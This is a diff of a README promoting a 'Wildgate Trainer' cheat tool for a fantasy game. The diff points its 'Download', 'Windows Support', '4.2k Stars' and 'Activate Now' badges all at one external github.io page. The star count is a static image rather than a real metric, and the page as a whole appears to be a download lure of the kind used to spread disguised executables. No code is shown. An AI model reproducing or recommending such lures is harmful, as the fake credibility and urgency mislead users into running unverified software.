@@ -2,10 +2,10 @@
 
 The fantasy world of *Wildgate* pushes players with unforgiving dungeons, PvP ambushes, and endless resource management. The **Wildgate Trainer** gives you complete flexibility over survival systems—allowing infinite stamina, adjustable health, and resource spawning. Whether you’re stress-testing builds, practicing duels, or exploring without limits, this tool puts the power in your hands.
 
-[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=download)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 4.2k Stars](https://img.shields.io/badge/GitHub-⭐️%204.2k%20Stars-black?style=for-the-badge\&logo=github)](#)
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
+[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=download)](https://wildgate-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://wildgate-trainer.github.io/.github/)
+[![⭐️ 4.2k Stars](https://img.shields.io/badge/GitHub-⭐️%204.2k%20Stars-black?style=for-the-badge\&logo=github)](https://wildgate-trainer.github.io/.github/)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://wildgate-trainer.github.io/.github/)
 
 ---
 
